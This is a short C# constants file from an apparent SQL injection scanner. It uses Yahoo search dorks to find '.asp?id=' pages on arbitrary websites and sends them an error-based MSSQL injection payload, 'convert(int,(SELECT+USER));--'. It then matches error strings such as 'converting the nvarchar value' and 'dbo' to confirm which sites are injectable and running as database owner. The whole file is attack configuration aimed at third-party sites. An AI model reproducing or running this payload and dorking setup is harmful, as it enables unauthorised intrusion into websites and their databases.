using System;
using System.Collections.Generic;
using System.Text;

namespace ScannerAdvSQLInjection {
    static class Global {
        public const string GLOBAL_SERVER_SEARCH_ENGINE = "search.yahoo.com";
        public const string GLOBAL_SERVER_SEARCH_ENGINE_PROTOCOL = "https";
        public const string GLOBAL_SERVER_SEARCH_ENGINE_LINK_PATTERNS = "ac-algo;td-u;bcan1cb";

        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH = "search?p=";
        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_VALUE = "\".asp{1}?{2}=\"";
        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_DEFAULT_VALUE_1 = "id";

        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED = "&b=";
        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED_DEFAULT_VALUE = "1";

        public const string GLOBAL_PARAM_SEARCH_ENGINE_VULN_VALUE = "convert(int,(SELECT+USER));--";
        public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE = "converting the nvarchar value";
        public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_DBO_USER = "'dbo'";
    }
}
